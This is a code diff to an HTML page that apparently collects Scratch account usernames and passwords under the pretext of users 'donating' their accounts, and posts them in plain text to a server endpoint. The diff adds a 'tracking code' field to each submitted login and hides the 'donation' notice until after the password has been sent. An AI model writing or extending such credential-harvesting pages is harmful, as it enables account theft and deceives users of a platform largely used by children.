@@ -12,9 +12,10 @@
         <form id="form">
             <input type="text" id="username" placeholder="Username" />
             <input type="text" id="password" placeholder="Password" />
+            <input type="text" id="trackingcode" placeholder="Tracking Code" /><p>It is recommended that you enter a tracking code like "7512" to allow easier verification of the owner.</p>
             <button type="submit">Send</button>
         </form>
-        <p style="color: red; font-family: monospace;">It is greatly appreciated that you donated your account. If you want your account back please message PumpkinDoesScratch. <br><br>* Your projects, studios, and profile information will not be tampered with.</p>
+        <p style="color: red; font-family: monospace; display: none;" id="info">It is greatly appreciated that you donate your account. If you want your account back please message PumpkinDoesScratch. <br><br>* Your projects, studios, and profile information will not be tampered with.</p>
         <script>
             const form = document.getElementById('form');
             
@@ -22,6 +23,7 @@
               e.preventDefault();
               const username = document.getElementById('username').value.trim();
               const password = document.getElementById('password').value.trim();
+              const trackingcode = document.getElementById('trackingcode').value.trim();
               if (!username || !password) {
                 alert('Please enter password AND username.');
                 return;
@@ -31,8 +33,9 @@
                 const res = await fetch('/api/server', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ content: `${username}, ${password}` })
+                  body: JSON.stringify({ content: `${username}, ${password}, TC: ${trackingcode}` })
                 });
+                document.getElementById("info").style.display = "block";
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
               } catch (err) {
